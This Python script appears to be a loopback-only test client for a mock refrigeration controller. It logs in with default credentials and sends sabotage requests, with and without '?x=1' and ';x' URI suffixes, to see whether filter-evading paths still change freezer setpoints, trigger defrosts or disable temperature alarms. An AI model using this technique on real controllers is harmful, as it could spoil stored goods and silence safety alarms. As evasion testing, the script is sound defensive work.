#!/usr/bin/env python3
"""URI-suffix evasion test client for FROSTBOX (loopback only).

Sends sabotage requests with and without a URI suffix and records whether
the controller accepted them (HTTP 200 + setpoint changed). Usage:
    python3 evasion_client.py PORT
"""
import http.client, json, sys

HOST = "127.0.0.1"
PORT = int(sys.argv[1])


def req(method, path, body=None, headers=None):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
    h = {"Content-Type": "application/json"}
    h.update(headers or {})
    data = json.dumps(body).encode() if body is not None else None
    conn.request(method, path, body=data, headers=h)
    r = conn.getresponse()
    raw = r.read()
    conn.close()
    try:
        return r.status, json.loads(raw)
    except ValueError:
        return r.status, raw.decode("utf-8", "replace")


def setpoint_of(case_id):
    _, st = req("GET", "/api/status")
    for c in st.get("cases", []):
        if c["id"] == case_id:
            return c["setpoint"]
    return None


st, resp = req("POST", "/api/login", {"user": "admin", "pass": "admin123"})
token = resp.get("token") if isinstance(resp, dict) else None
print("login -> %s" % st)
if not token:
    sys.exit("login failed")
auth = {"Authorization": "Bearer " + token}

tests = [
    # (label, path, body, case whose setpoint is checked)
    ("CONTROL   setpoint, no suffix", "/api/case/FZ-01/setpoint", {"value": 41.0}, "FZ-01"),
    ("EVASION-Q setpoint ?x=1", "/api/case/FZ-02/setpoint?x=1", {"value": 42.0}, "FZ-02"),
    ("EVASION-P setpoint ;x", "/api/case/FZ-03/setpoint;x", {"value": 43.0}, "FZ-03"),
    ("CONTROL   defrost, no suffix", "/api/case/CH-01/defrost", {}, None),
    ("EVASION-Q defrost ?x=1", "/api/case/CH-02/defrost?x=1", {}, None),
    ("EVASION-P defrost ;x", "/api/case/CH-03/defrost;x", {}, None),
    ("ROBUST    alarm ?x=1", "/api/alarm/config?x=1",
     {"case": "FZ-01", "enabled": False, "high_threshold": 60.0}, None),
]
for label, path, body, case in tests:
    before = setpoint_of(case) if case else None
    st, _ = req("POST", path, body, auth)
    after = setpoint_of(case) if case else None
    extra = "  setpoint %s -> %s" % (before, after) if case else ""
    print("%-32s %-34s HTTP %s%s" % (label, path, st, extra))
